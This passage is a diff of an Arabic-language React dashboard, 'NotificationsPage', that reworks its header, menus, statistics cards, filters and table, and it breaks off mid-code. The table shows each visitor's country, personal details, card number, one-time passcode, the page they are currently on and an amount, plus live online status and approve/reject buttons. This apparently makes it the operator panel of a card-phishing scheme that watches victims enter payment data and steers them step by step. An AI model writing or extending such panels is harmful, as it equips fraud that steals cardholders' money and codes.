     return (
       <div className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20 flex items-center justify-center">
         <div className="flex flex-col items-center gap-4">
@@ -1103,139 +1360,128 @@ export default function NotificationsPage() {
   const approvedTrend = [1, 2, 4, 3, 5, 7, 6]
 
   return (
-    <div dir="rtl" className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20">
-      {/* Mobile menu */}
-      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
-        <SheetContent side="right" className="w-[250px] sm:w-[400px]" dir="rtl">
-          <SheetHeader className="mb-6">
-            <SheetTitle className="flex items-center gap-2">
-              <Bell className="h-5 w-5 text-primary" />
-              <span>لوحة الإشعارات</span>
-            </SheetTitle>
-          </SheetHeader>
-          <div className="space-y-6">
-            <div className="flex items-center gap-4">
-              <Avatar>
-                <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
-                <AvatarFallback>M</AvatarFallback>
-              </Avatar>
-              <div>
-                <p className="font-medium">مدير النظام</p>
-                <p className="text-sm text-muted-foreground">admin@example.com</p>
-              </div>
-            </div>
-            <Separator />
-            <nav className="space-y-2">
-              <Button variant="ghost" className="w-full justify-start" onClick={() => setMobileMenuOpen(false)}>
-                <Bell className="mr-2 h-4 w-4" />
-                الإشعارات
-              </Button>
-              <Button variant="ghost" className="w-full justify-start" onClick={() => setSettingsOpen(true)}>
-                <Settings className="mr-2 h-4 w-4" />
-                الإعدادات
-              </Button>
-              <Button
-                variant="ghost"
-                className="w-full justify-start"
-                onClick={() => {
-                  setExportDialogOpen(true)
-                  setMobileMenuOpen(false)
-                }}
-              >
-                <Download className="mr-2 h-4 w-4" />
-                تصدير البيانات
-              </Button>
-              <Button variant="ghost" className="w-full justify-start text-red-500" onClick={handleLogout}>
-                <LogOut className="mr-2 h-4 w-4" />
-                تسجيل الخروج
-              </Button>
-            </nav>
-          </div>
-        </SheetContent>
-      </Sheet>
-
-      {/* Settings panel */}
-      <SettingsPanel open={settingsOpen} onOpenChange={setSettingsOpen} />
-
-      {/* Export dialog */}
-      <ExportDialog open={exportDialogOpen} onOpenChange={setExportDialogOpen} notifications={filteredNotifications} />
-
-      {/* Enhanced Header */}
-      <header className="sticky top-0 z-50 border-b bg-background/80 backdrop-blur-xl supports-[backdrop-filter]:bg-background/60">
-        <div className="flex items-center justify-between p-4">
-          <div className="flex items-center gap-4">
-            <Button variant="ghost" size="icon" className="md:hidden" onClick={() => setMobileMenuOpen(true)}>
-              <Menu className="h-5 w-5" />
-            </Button>
-            <div className="flex items-center gap-3">
-              <div className="relative">
-                <div className="bg-gradient-to-br from-primary to-primary/80 p-3 rounded-xl shadow-lg">
-                  <Bell className="h-6 w-6 text-white" />
+    <>
+      <div dir="rtl" className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20">
+        {/* Mobile menu */}
+        <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
+          <SheetContent side="right" className="w-[280px] sm:w-[350px]" dir="rtl">
+            <SheetHeader className="mb-6">
+              <SheetTitle className="flex items-center gap-2">
+                <Bell className="h-5 w-5 text-primary" />
+                <span>لوحة الإشعارات</span>
+              </SheetTitle>
+            </SheetHeader>
+            <div className="space-y-6">
+              <div className="flex items-center gap-4">
+                <Avatar className="h-12 w-12">
+                  <AvatarImage src="/placeholder.svg" alt="صورة المستخدم" />
+                  <AvatarFallback className="bg-gradient-to-br from-primary to-primary/80 text-white">م</AvatarFallback>
+                </Avatar>
+                <div>
+                  <p className="font-medium">مدير النظام</p>
+                  <p className="text-sm text-muted-foreground">admin@example.com</p>
                 </div>
-                {pendingCount > 0 && (
-                  <div className="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full h-5 w-5 flex items-center justify-center animate-pulse">
-                    {pendingCount}
-                  </div>
-                )}
               </div>
-              <div>
-                <h1 className="text-xl font-bold bg-gradient-to-r from-foreground to-foreground/70 bg-clip-text text-transparent">
-                  لوحة الإشعارات المتقدمة
-                </h1>
-                <p className="text-sm text-muted-foreground">
-                  آخر تحديث: {format(new Date(), "HH:mm", { locale: ar })}
-                </p>
+              <Separator />
+              <nav className="space-y-2">
+                <Button
+                  variant="ghost"
+                  className="w-full justify-start"
+                  onClick={() => {
+                    setMobileMenuOpen(false)
+                    handleToggleStatistics()
+                  }}
+                >
+                  <Activity className="mr-2 h-4 w-4" />
+                  {showStatistics ? "إخفاء الإحصائيات" : "عرض الإحصائيات"}
+                </Button>
+                <Button
+                  variant="ghost"
+                  className="w-full justify-start"
+                  onClick={() => {
+                    setMobileMenuOpen(false)
+                    setSettingsOpen(true)
+                  }}
+                >
+                  <Settings className="mr-2 h-4 w-4" />
+                  الإعدادات
+                </Button>
+                <Button
+                  variant="ghost"
+                  className="w-full justify-start"
+                  onClick={() => {
+                    setMobileMenuOpen(false)
+                    setExportDialogOpen(true)
+                  }}
+                >
+                  <Download className="mr-2 h-4 w-4" />
+                  تصدير البيانات
+                </Button>
+                <Button
+                  variant="ghost"
+                  className="w-full justify-start"
+                  onClick={() => {
+                    setMobileMenuOpen(false)
+                    handleRefresh()
+                  }}
+                >
+                  <RefreshCw className="mr-2 h-4 w-4" />
+                  تحديث البيانات
+                </Button>
+                <Separator />
+                <Button
+                  variant="ghost"
+                  className="w-full justify-start text-red-500 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-950/30"
+                  onClick={handleLogout}
+                >
+                  <LogOut className="mr-2 h-4 w-4" />
+                  تسجيل الخروج
+                </Button>
+              </nav>
+            </div>
+          </SheetContent>
+        </Sheet>
+
+        {/* Header */}
+        <header className="sticky top-0 z-50 border-b bg-background/95 backdrop-blur-xl supports-[backdrop-filter]:bg-background/60 shadow-sm">
+          <div className="flex items-center justify-between p-4">
+            <div className="flex items-center gap-4">
+              <Button variant="ghost" size="icon" className="md:hidden" onClick={() => setMobileMenuOpen(true)}>
+                <Menu className="h-5 w-5" />
+              </Button>
+              <div className="flex items-center gap-3">
+                <div className="relative">
+                  <div className="bg-gradient-to-br from-primary to-primary/80 p-3 rounded-xl shadow-lg">
+                    <Bell className="h-6 w-6 text-white" />
+                  </div>
+                  {pendingCount > 0 && (
+                    <div className="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full h-5 w-5 flex items-center justify-center animate-pulse shadow-md">
+                      {pendingCount}
+                    </div>
+                  )}
+                </div>
+                <div>
+                  <h1 className="text-xl font-bold bg-gradient-to-r from-foreground to-foreground/70 bg-clip-text text-transparent">
+                    لوحة الإشعارات المتقدمة
+                  </h1>
+                  <p className="text-sm text-muted-foreground">
+                    آخر تحديث: {format(new Date(), "HH:mm", { locale: ar })}
+                  </p>
+                </div>
               </div>
             </div>
-          </div>
 
-          <div className="flex items-center gap-2">
-          <TooltipProvider>
-              <Tooltip>
-                <TooltipTrigger asChild>
-                  <Button
-                    variant="outline"
-                    size="icon"
-                    onClick={handleShowStatstics}
-                    className="relative overflow-hidden bg-transparent"
-                  >
-                  {showStatstics?<Eye/>:  <EyeClosed className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />}
-                  </Button>
-                </TooltipTrigger>
-                <TooltipContent>
-                  <p> اخفاءالبيانات</p>
-                </TooltipContent>
-              </Tooltip>
-            </TooltipProvider>
-            <TooltipProvider>
-              <Tooltip>
-                <TooltipTrigger asChild>
-                  <Button
-                    variant="outline"
-                    size="icon"
-                    onClick={handleRefresh}
-                    className="relative overflow-hidden bg-transparent"
-                  >
-                    <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
-                  </Button>
-                </TooltipTrigger>
-                <TooltipContent>
-                  <p>تحديث البيانات</p>
-                </TooltipContent>
-              </Tooltip>
-            </TooltipProvider>
-
+            {/* Desktop Actions */}
             <div className="hidden md:flex items-center gap-2">
               <TooltipProvider>
                 <Tooltip>
                   <TooltipTrigger asChild>
-                    <Button variant="outline" size="icon" onClick={() => setSettingsOpen(true)}>
-                      <Settings className="h-4 w-4" />
-                      <span className="sr-only">الإعدادات</span>
+                    <Button variant="outline" size="icon" onClick={handleRefresh} disabled={isLoading}>
+                      <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
                     </Button>
                   </TooltipTrigger>
                   <TooltipContent>
-                    <p>الإعدادات</p>
+                    <p>تحديث البيانات (Ctrl+R)</p>
                   </TooltipContent>
                 </Tooltip>
               </TooltipProvider>
@@ -1243,611 +1489,392 @@ export default function NotificationsPage() {
               <TooltipProvider>
                 <Tooltip>
                   <TooltipTrigger asChild>
-                    <Button variant="outline" size="icon" onClick={() => setExportDialogOpen(true)}>
-                      <Download className="h-4 w-4" />
-                      <span className="sr-only">تصدير</span>
+                    <Button variant="outline" size="icon" onClick={handleToggleStatistics}>
+                      <Activity className="h-4 w-4" />
                     </Button>
                   </TooltipTrigger>
                   <TooltipContent>
-                    <p>تصدير البيانات</p>
+                    <p>{showStatistics ? "إخفاء الإحصائيات" : "عرض الإحصائيات"}</p>
                   </TooltipContent>
                 </Tooltip>
               </TooltipProvider>
 
-              <Button
-                variant="destructive"
-                onClick={handleClearAll}
-                disabled={notifications.length === 0}
-                className="hidden sm:flex items-center gap-2"
-              >
-                <Trash2 className="h-4 w-4" />
-                مسح الكل
-              </Button>
+              <DropdownMenu>
+                <DropdownMenuTrigger asChild>
+                  <Button variant="outline" size="icon">
+                    <User className="h-4 w-4" />
+                  </Button>
+                </DropdownMenuTrigger>
+                <DropdownMenuContent align="end" className="w-56" >
+                  <DropdownMenuLabel className="font-normal">
+                    <div className="flex flex-col space-y-1">
+                      <p className="text-sm font-medium">مدير النظام</p>
+                      <p className="text-xs text-muted-foreground">admin@example.com</p>
+                    </div>
+                  </DropdownMenuLabel>
+                  <DropdownMenuSeparator />
+                  <DropdownMenuItem onClick={() => setSettingsOpen(true)}>
+                    <Settings className="ml-2 h-4 w-4" />
+                    <span>الإعدادات</span>
+                  </DropdownMenuItem>
+                  <DropdownMenuItem onClick={() => setExportDialogOpen(true)}>
+                    <Download className="ml-2 h-4 w-4" />
+                    <span>تصدير البيانات</span>
+                  </DropdownMenuItem>
+                  <DropdownMenuSeparator />
+                  <DropdownMenuItem onClick={handleLogout} className="text-red-600 dark:text-red-400">
+                    <LogOut className="ml-2 h-4 w-4" />
+                    <span>تسجيل الخروج</span>
+                  </DropdownMenuItem>
+                </DropdownMenuContent>
+              </DropdownMenu>
             </div>
-
-            <DropdownMenu>
-              <DropdownMenuTrigger asChild>
-                <Button variant="ghost" className="relative h-10 w-10 rounded-full">
-                  <Avatar className="h-10 w-10 ring-2 ring-primary/20">
-                    <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
-                    <AvatarFallback className="bg-gradient-to-br from-primary to-primary/80 text-white">
-                      مد
-                    </AvatarFallback>
-                  </Avatar>
-                </Button>
-              </DropdownMenuTrigger>
-              <DropdownMenuContent align="end" className="w-56">
-                <DropdownMenuLabel>
-                  <div className="flex flex-col space-y-1">
-                    <p className="text-sm font-medium">مدير النظام</p>
-                    <p className="text-xs text-muted-foreground">admin@example.com</p>
-                  </div>
-                </DropdownMenuLabel>
-                <DropdownMenuSeparator />
-                <DropdownMenuItem onClick={() => setSettingsOpen(true)}>
-                  <Settings className="ml-2 h-4 w-4" />
-                  الإعدادات
-                </DropdownMenuItem>
-                <DropdownMenuItem onClick={() => setExportDialogOpen(true)}>
-                  <Download className="ml-2 h-4 w-4" />
-                  تصدير البيانات
-                </DropdownMenuItem>
-                <DropdownMenuSeparator />
-                <DropdownMenuItem onClick={handleLogout} className="text-red-600">
-                  <LogOut className="ml-2 h-4 w-4" />
-                  تسجيل الخروج
-                </DropdownMenuItem>
-              </DropdownMenuContent>
-            </DropdownMenu>
           </div>
-        </div>
-      </header>
+        </header>
 
-      <div className="p-6">
-        {/* Enhanced Statistics Grid */}
-        <div className={`grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8 ${showStatstics?"":"hidden"}`}>
-          <StatisticsCard
-            title="إجمالي الزوار"
-            value={totalVisitorsCount}
-            change="+12%"
-            changeType="increase"
-            icon={Users}
-            color="bg-gradient-to-br from-blue-500 to-blue-600"
-            trend={visitorTrend}
-          />
-          <StatisticsCard
-            title="المستخدمين المتصلين"
-            value={onlineUsersCount}
-            change="+5%"
-            changeType="increase"
-            icon={UserCheck}
-            color="bg-gradient-to-br from-green-500 to-green-600"
-            trend={onlineTrend}
-          />
-          <StatisticsCard
-            title="معلومات البطاقات"
-            value={cardSubmissionsCount}
-            change="+8%"
-            changeType="increase"
-            icon={CreditCard}
-            color="bg-gradient-to-br from-purple-500 to-purple-600"
-            trend={cardTrend}
-          />
-          <StatisticsCard
-            title="الموافقات"
-            value={approvedCount}
-            change="+15%"
-            changeType="increase"
-            icon={CheckCircle}
-            color="bg-gradient-to-br from-emerald-500 to-emerald-600"
-            trend={approvedTrend}
-          />
-        </div>
-
-        {/* Enhanced Main Content */}
-        <Card className="bg-card/50 backdrop-blur-sm border-0 shadow-xl">
-          <CardHeader className="pb-4">
-            <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
-              <div>
-                <CardTitle className="text-2xl font-bold flex items-center gap-3">
-                  <Activity className="h-6 w-6 text-primary" />
-                  إدارة الإشعارات
-                </CardTitle>
-                <CardDescription className="mt-1">عرض وإدارة جميع الإشعارات والبيانات المستلمة</CardDescription>
-              </div>
-
-              <div className="flex flex-col sm:flex-row gap-3">
-                <SearchBar onSearch={handleSearch} />
-                <div className="flex gap-2">
-                  <DropdownMenu>
-                    <DropdownMenuTrigger asChild>
-                      <Button variant="outline" size="sm" className="gap-2 bg-transparent">
-                        <Filter className="h-4 w-4" />
-                        فلترة
-                      </Button>
-                    </DropdownMenuTrigger>
-                    <DropdownMenuContent align="end">
-                      <DropdownMenuItem onClick={() => setFilterType("all")}>جميع الإشعارات</DropdownMenuItem>
-                      <DropdownMenuItem onClick={() => setFilterType("card")}>البطاقات فقط</DropdownMenuItem>
-                      <DropdownMenuItem onClick={() => setFilterType("online")}>المتصلين فقط</DropdownMenuItem>
-                    </DropdownMenuContent>
-                  </DropdownMenu>
-
-                  <DropdownMenu>
-                    <DropdownMenuTrigger asChild>
-                      <Button variant="outline" size="sm" className="gap-2 bg-transparent">
-                        <ArrowUpDown className="h-4 w-4" />
-                        ترتيب
-                      </Button>
-                    </DropdownMenuTrigger>
-                    <DropdownMenuContent align="end">
-                      <DropdownMenuItem onClick={() => setSortBy("date")}>حسب التاريخ</DropdownMenuItem>
-                      <DropdownMenuItem onClick={() => setSortBy("status")}>حسب الحالة</DropdownMenuItem>
-                      <DropdownMenuItem onClick={() => setSortBy("country")}>حسب الدولة</DropdownMenuItem>
-                    </DropdownMenuContent>
-                  </DropdownMenu>
-                </div>
-              </div>
-            </div>
-
-            {/* Filter Tabs */}
-            <div className="flex flex-wrap gap-2 mt-4">
-              <Button
-                variant={filterType === "all" ? "default" : "outline"}
-                onClick={() => setFilterType("all")}
-                size="sm"
-                className="gap-2"
-              >
-                الكل
-                <Badge variant="secondary" className="bg-background text-foreground">
-                  {notifications.length}
-                </Badge>
-              </Button>
-              <Button
-                variant={filterType === "card" ? "default" : "outline"}
-                onClick={() => setFilterType("card")}
-                size="sm"
-                className="gap-2"
-              >
-                <CreditCard className="h-4 w-4" />
-                البطاقات
-                <Badge variant="secondary" className="bg-background text-foreground">
-                  {cardSubmissionsCount}
-                </Badge>
-              </Button>
-              <Button
-                variant={filterType === "online" ? "default" : "outline"}
-                onClick={() => setFilterType("online")}
-                size="sm"
-                className="gap-2"
-              >
-                <UserCheck className="h-4 w-4" />
-                المتصلين
-                <Badge variant="secondary" className="bg-background text-foreground">
-                  {onlineUsersCount}
-                </Badge>
-              </Button>
-            </div>
-          </CardHeader>
-
-          <CardContent className="p-0">
-            {/* Desktop Table View */}
-            <div className="hidden lg:block overflow-x-auto">
-              <table className="w-full">
-                <thead>
-                  <tr className="border-b bg-muted/30">
-                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">الدولة</th>
-                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">المعلومات</th>
-                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">الحالة</th>
-                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">الوقت</th>
-                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الاتصال</th>
-                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الكود</th>
-                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">تحديث الخطوة</th>
-                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الإجراءات</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  {paginatedNotifications.map((notification, index) => (
-                    <tr key={notification.id}>
-                      <td className="px-6 py-4">
-                        <div className="flex items-center gap-3">
-                          <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
-                            <MapPin className="h-4 w-4 text-primary" />
-                          </div>
-                          <span className="font-medium">{notification.country || "غير معروف"}</span>
-                        </div>
-                      </td>
-                      <td className="px-6 py-4">
-                        <div className="flex flex-wrap gap-2">
-                          <Badge
-                            variant={notification.phone ? "default" : "secondary"}
-                            className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.phone ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white" : ""
-                            }`}
-                            onClick={() => handleInfoClick(notification, "personal")}
-                          >
-                            <User className="h-3 w-3 mr-1" />
-                            {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
-                          </Badge>
-                          <Badge
-                            variant={notification.cardNumber ? "default" : "secondary"}
-                            className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.cardNumber ? "bg-gradient-to-r from-green-500 to-green-600 text-white" : ""
-                            }`}
-                            onClick={() => handleInfoClick(notification, "card")}
-                          >
-                            <CreditCard className="h-3 w-3 mr-1" />
-                            {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
-                          </Badge>
-                        </div>
-                      </td>
-                      <td className="px-6 py-4">
-                        {notification.status === "approved" ? (
-                          <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
-                            <CheckCircle className="h-3 w-3 mr-1" />
-                            موافق 
-                          </Badge>
-                        ) : notification.status === "rejected" ? (
-                          <Badge className="bg-gradient-to-r from-red-500 to-red-600 text-white">
-                            <XCircle className="h-3 w-3 mr-1" />
-                            مرفوض
-                          </Badge>
-                        ) : (
-                          <Badge className="bg-gradient-to-r from-yellow-500 to-yellow-600 text-white">
-                            <Clock className="h-3 w-3 mr-1" />
-                           معلق
-                          </Badge>
-                        )}
-                      </td>
-                      <td className="px-6 py-4">
-                        <div className="flex items-center gap-2 text-sm text-muted-foreground">
-                          <Clock className="h-4 w-4" />
-                          {notification.createdDate &&
-                            formatDistanceToNow(new Date(notification.createdDate), {
-                              addSuffix: true,
-                              locale: ar,
-                            })}
-                        </div>
-                      </td>
-                      <td className="px-6 py-4 text-center">
-                        <UserStatus userId={notification.id} />
-                      </td>
-                      <td className="px-6 py-4 text-center">
-                        {notification.otp && (
-                          <Badge variant="outline" className="bg-blue-50 text-blue-700 border-blue-200 ">
-                            {notification.otp}
-                          </Badge>
-                        )}
-                      </td>
-                      <td className="px-6 py-4">
-                        <div className="flex flex-wrap justify-center gap-1">
-                        <Badge variant={'outline'}>{notification?.currentPage}</Badge>
-
-                        </div>
-                      </td>
-                      <td className="px-6 py-4">
-                        <div className="flex justify-center gap-1">
-                          <TooltipProvider>
-                            <Tooltip>
-                              <TooltipTrigger asChild>
-                                <Button
-                                  variant="outline"
-                                  size="sm"
-                                  onClick={() => handleApproval("approved", notification.id)}
-                                  className="bg-gradient-to-r from-green-500 to-green-600 text-white border-0 hover:from-green-600 hover:to-green-700"
-                                  disabled={notification.status === "approved"}
-                                >
-                                <p>موافقة</p>
-                                  <CheckCircle className="h-4 w-4" />
-                                </Button>
-                              </TooltipTrigger>
-                              <TooltipContent>
-                                <p>موافقة</p>
-                              </TooltipContent>
-                            </Tooltip>
-                          </TooltipProvider>
-
-                          <TooltipProvider>
-                            <Tooltip>
-                              <TooltipTrigger asChild>
-                                <Button
-                                  variant="outline"
-                                  size="sm"
-                                  onClick={() => handleApproval("rejected", notification.id)}
-                                  className="bg-gradient-to-r from-red-500 to-red-600 text-white border-0 hover:from-red-600 hover:to-red-700"
-                                  disabled={notification.status === "rejected"}
-                                >
-                                <p>رفض</p>
-                                  <XCircle className="h-4 w-4" />
-                                </Button>
-                              </TooltipTrigger>
-                              <TooltipContent>
-                                <p>رفض</p>
-                              </TooltipContent>
-                            </Tooltip>
-                          </TooltipProvider>
-
-                          <TooltipProvider>
-                            <Tooltip>
-                              <TooltipTrigger asChild>
-                                <Button
-                                  variant="ghost"
-                                  size="sm"
-                                  onClick={() => handleDelete(notification.id)}
-                                  className="text-red-500 hover:text-red-600 hover:bg-red-50"
-                                >
-                                  <Trash2 className="h-4 w-4" />
-                                </Button>
-                              </TooltipTrigger>
-                              <TooltipContent>
-                                <p>حذف</p>
-                              </TooltipContent>
-                            </Tooltip>
-                          </TooltipProvider>
-                          <Badge>{notification?.amount||0.0}</Badge>
-
-                        </div>
-                      </td>
-                    </tr>
-                  ))}
-                </tbody>
-              </table>
-            </div>
-
-            {/* Mobile Card View */}
-            <div className="lg:hidden space-y-4 p-4">
-              {paginatedNotifications.map((notification) => (
-                <Card key={notification.id}>
-                  <CardHeader className="pb-3">
-                    <div className="flex justify-between items-start">
-                      <div className="flex items-center gap-3">
-                        <div className="w-10 h-10 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
-                          <MapPin className="h-5 w-5 text-primary" />
-                        </div>
-                        <div>
-                          <p className="font-semibold">{notification.country || "غير معروف"}</p>
-                          <p className="text-sm text-muted-foreground">
-                            {notification.createdDate &&
-                              formatDistanceToNow(new Date(notification.createdDate), {
-                                addSuffix: true,
-                                locale: ar,
-                              })}
-                          </p>
-                        </div>
-                      </div>
-                      <UserStatus userId={notification.id} />
-                    </div>
-                  </CardHeader>
-
-                  <CardContent className="pt-0">
-                    <div className="space-y-4">
-                      <div className="flex flex-wrap gap-2">
-                        <Badge
-                          variant={notification.phone ? "default" : "secondary"}
-                          className={`cursor-pointer ${
-                            notification.phone ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white" : ""
-                          }`}
-                          onClick={() => handleInfoClick(notification, "personal")}
-                        >
-                          <User className="h-3 w-3 mr-1" />
-                          {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
-                        </Badge>
-                        <Badge
-                          variant={notification.cardNumber ? "default" : "secondary"}
-                          className={`cursor-pointer ${
-                            notification.cardNumber ? "bg-gradient-to-r from-green-500 to-green-600 text-white" : ""
-                          }`}
-                          onClick={() => handleInfoClick(notification, "card")}
-                        >
-                          <CreditCard className="h-3 w-3 mr-1" />
-                          {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
-                        </Badge>
-                      </div>
-
-                      <div className="pt-3 border-t">
-                        <p className="text-sm font-medium text-muted-foreground mb-2">تحديث الخطوة:</p>
-                        <div className="flex flex-wrap gap-2">
-                         <Badge>{handlePageName(notification?.currentPage!)}</Badge>
-                        </div>
-                      </div>
-
-                      <div className="flex justify-between items-center">
-                        <div className="flex items-center gap-2">
-                          <span className="text-sm text-muted-foreground">الحالة:</span>
-                          {notification.status === "approved" ? (
-                            <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
-                              <CheckCircle className="h-3 w-3 mr-1" />
-                              موافق عليه
-                            </Badge>
-                          ) : notification.status === "rejected" ? (
-                            <Badge className="bg-gradient-to-r from-red-500 to-red-600 text-white">
-                              <XCircle className="h-3 w-3 mr-1" />
-                              مرفوض
-                            </Badge>
-                          ) : (
-                            <Badge className="bg-gradient-to-r from-yellow-500 to-yellow-600 text-white">
-                              <Clock className="h-3 w-3 mr-1" />
-                              قيد المراجعة
-                            </Badge>
-                          )}
-                        </div>
-                        {notification.otp && (
-                          <Badge variant="outline" className="bg-blue-50 text-blue-700">
-                            {notification.otp}
-                          </Badge>
-                        )}
-                      </div>
-
-                      <div className="flex gap-2 pt-2 border-t">
-                        <Button
-                          onClick={() => handleApproval("approved", notification.id)}
-                          className="flex-1 bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700"
-                          size="sm"
-                          disabled={notification.status === "approved"}
-                        >
-                          <CheckCircle className="h-4 w-4 mr-1" />
-                          موافقة
-                        </Button>
-                        <Button
-                          onClick={() => handleApproval("rejected", notification.id)}
-                          className="flex-1 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700"
-                          size="sm"
-                          disabled={notification.status === "rejected"}
-                        >
-                          <XCircle className="h-4 w-4 mr-1" />
-                          رفض
-                        </Button>
-                        <Button
-                          variant="outline"
-                          onClick={() => handleDelete(notification.id)}
-                          className="text-red-500 hover:text-red-600 hover:bg-red-50"
-                          size="sm"
-                        >
-                          <Trash2 className="h-4 w-4" />
-                        </Button>
-
-                        <Badge>{notification?.amount}</Badge>
-                        <Badge variant={'outline'}>{notification?.currentPage}</Badge>
-                        
-                      </div>
-                    </div>
-                  </CardContent>
-                </Card>
-              ))}
-            </div>
-
-            {/* Empty State */}
-            {paginatedNotifications.length === 0 && (
-              <div className="text-center py-12">
-                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-muted flex items-center justify-center">
-                  <Bell className="h-8 w-8 text-muted-foreground" />
-                </div>
-                <h3 className="text-lg font-semibold mb-2">لا توجد إشعارات</h3>
-                <p className="text-muted-foreground">لا توجد إشعارات متطابقة مع الفلتر المحدد</p>
-              </div>
-            )}
-          </CardContent>
-
-          {/* Enhanced Pagination */}
-          {filteredNotifications.length > 0 && (
-            <CardFooter className="border-t bg-muted/20 p-4">
-              <Pagination
-                currentPage={currentPage}
-                totalPages={totalPages}
-                onPageChange={handlePageChange}
-                totalItems={filteredNotifications.length}
-                itemsPerPage={itemsPerPage}
+        <div className="p-6 space-y-8 max-w-[1920px] mx-auto">
+          {/* Statistics Grid */}
+          {showStatistics && (
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 animate-in fade-in slide-in-from-top-4 duration-500">
+              <StatisticsCard
+                title="إجمالي الزوار"
+                value={totalVisitorsCount}
+                change="+12%"
+                changeType="increase"
+                icon={Users}
+                color="bg-gradient-to-br from-blue-500 to-blue-600"
+                trend={visitorTrend}
               />
-            </CardFooter>
+              <StatisticsCard
+                title="المستخدمين المتصلين"
+                value={onlineUsersCount}
+                change="+5%"
+                changeType="increase"
+                icon={UserCheck}
+                color="bg-gradient-to-br from-green-500 to-green-600"
+                trend={onlineTrend}
+              />
+              <StatisticsCard
+                title="معلومات البطاقات"
+                value={cardSubmissionsCount}
+                change="+8%"
+                changeType="increase"
+                icon={CreditCard}
+                color="bg-gradient-to-br from-purple-500 to-purple-600"
+                trend={cardTrend}
+              />
+              <StatisticsCard
+                title="الموافقات"
+                value={approvedCount}
+                change="+15%"
+                changeType="increase"
+                icon={CheckCircle}
+                color="bg-gradient-to-br from-emerald-500 to-emerald-600"
+                trend={approvedTrend}
+              />
+            </div>
           )}
-        </Card>
+
+          {/* Filters and Search */}
+          <Card className="bg-card/50 backdrop-blur-sm border shadow-md">
+            <CardContent className="p-4">
+              <div className="flex flex-col lg:flex-row gap-4 items-start lg:items-center justify-between">
+                <div className="flex flex-col sm:flex-row gap-3 w-full lg:w-auto">
+                  <Tabs
+                    value={filterType}
+                    onValueChange={(value: any) => setFilterType(value)}
+                    className="w-full sm:w-auto"
+                  >
+                    <TabsList className="grid grid-cols-4 w-full sm:w-auto">
+                      <TabsTrigger value="all" className="flex items-center gap-1">
+                        <Filter className="h-3 w-3" />
+                        الكل
+                      </TabsTrigger>
+                      <TabsTrigger value="pending" className="flex items-center gap-1">
+                        <Clock className="h-3 w-3" />
+                        معلق
+                      </TabsTrigger>
+                      <TabsTrigger value="card" className="flex items-center gap-1">
+                        <CreditCard className="h-3 w-3" />
+                        بطاقات
+                      </TabsTrigger>
+                      <TabsTrigger value="online" className="flex items-center gap-1">
+                        <UserCheck className="h-3 w-3" />
+                        متصل
+                      </TabsTrigger>
+                    </TabsList>
+                  </Tabs>
+
+                  <Select value={sortBy} onValueChange={(value: any) => setSortBy(value)}>
+                    <SelectTrigger className="w-full sm:w-[180px]">
+                      <ArrowUpDown className="h-4 w-4 ml-2" />
+                      <SelectValue placeholder="ترتيب حسب" />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="date">التاريخ</SelectItem>
+                      <SelectItem value="status">الحالة</SelectItem>
+                      <SelectItem value="country">الدولة</SelectItem>
+                    </SelectContent>
+                  </Select>
+                </div>
+
+                <div className="w-full lg:w-[400px]">
+                  <SearchBar onSearch={handleSearch} value={searchTerm} />
+                </div>
+              </div>
+            </CardContent>
+          </Card>
+
+          {/* Main Content Table */}
+          <Card className="bg-card/50 backdrop-blur-sm border shadow-md">
+            <CardHeader className="pb-4 border-b">
+              <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
+                <div>
+                  <CardTitle className="text-2xl font-bold flex items-center gap-3">
+                    <Activity className="h-6 w-6 text-primary" />
+                    إدارة الإشعارات
+                  </CardTitle>
+                  <CardDescription className="mt-1">
+                    عرض وإدارة جميع الإشعارات والبيانات المستلمة ({filteredNotifications.length} إشعار)
+                  </CardDescription>
+                </div>
+                {notifications.length > 0 && (
+                  <Button variant="destructive" size="sm" onClick={handleClearAll}>
+                    <Trash2 className="h-4 w-4 ml-2" />
+                    مسح الكل
+                  </Button>
+                )}
+              </div>
+            </CardHeader>
+            <CardContent className="p-0">
+              {paginatedNotifications.length === 0 ? (
